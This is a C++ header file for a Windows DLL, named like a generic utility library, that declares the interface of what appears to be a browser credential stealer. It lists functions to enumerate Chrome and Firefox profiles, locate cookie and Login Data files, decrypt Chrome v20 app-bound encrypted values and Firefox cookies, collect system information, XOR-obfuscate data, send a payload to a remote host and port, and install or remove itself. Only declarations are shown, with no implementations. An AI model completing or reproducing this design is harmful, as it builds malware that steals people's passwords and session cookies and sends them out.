#pragma once
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <cstdint>

namespace sqlite_minimal { class Database; }

struct ProfileRec {
    std::wstring name;
    std::wstring cookiePath;
    std::wstring loginDataPath;
    std::wstring localStatePath;
    std::wstring profileDir;
    bool isChromium = false;
};

#ifdef UTILITY_EXPORTS
  #define U_API __declspec(dllexport)
#else
  #define U_API __declspec(dllimport)
#endif

extern "C" {

    U_API bool GetData(const wchar_t* out);
    U_API bool GetLogins(const wchar_t* out);
    U_API bool GetSession(const wchar_t* out);
    U_API bool GetAppData(const wchar_t* out);
    U_API bool GetInfo(char* out, size_t* sz);
    U_API bool WriteInfo(const wchar_t* out);
    U_API bool GetAssets(const wchar_t* manifest, const wchar_t* archive, size_t maxBytes);
    U_API bool GetCache(const wchar_t* outDir);
    U_API bool GetDiag(const wchar_t* out);
    U_API int  EnumerateProfiles(ProfileRec* out, int maxCount);
    U_API bool DecryptBlob(const uint8_t* ct, size_t ctl, uint8_t* pt, size_t* ptl);
    U_API bool SendData(const char* host, int port, const char* payload);
    U_API void Cleanup();
    U_API bool Install(const wchar_t* src);
    U_API bool Remove();
    U_API bool IsActive();
}

bool ChromeV20Decrypt(const std::wstring& localStatePath,
                      const std::vector<uint8_t>& encValue,
                      std::vector<uint8_t>& plaintext);
void ChromeV20Cleanup();
bool FirefoxDecryptCookie(const std::wstring& profileDir,
                          const std::vector<uint8_t>& encValue,
                          std::vector<uint8_t>& plaintext);

namespace util {
    bool CopyToTemp(const std::wstring& s, std::wstring& o);
    bool ReadBytes(const std::wstring& p, std::vector<uint8_t>& o);
    bool WriteBytes(const std::wstring& p, const void* d, size_t n);
    bool OpenDb(const std::wstring& s, sqlite_minimal::Database& db, std::wstring* tp);
    bool Decrypt(const std::vector<uint8_t>& ct, std::vector<uint8_t>& pt);
    std::string SysInfo();
    void XorCrypt(uint8_t* d, size_t n);
    void SecureZero(void* p, size_t n);
    std::wstring TempDir();
    std::wstring LocalAppDataDir();
    std::wstring GetAppDataDir();
}
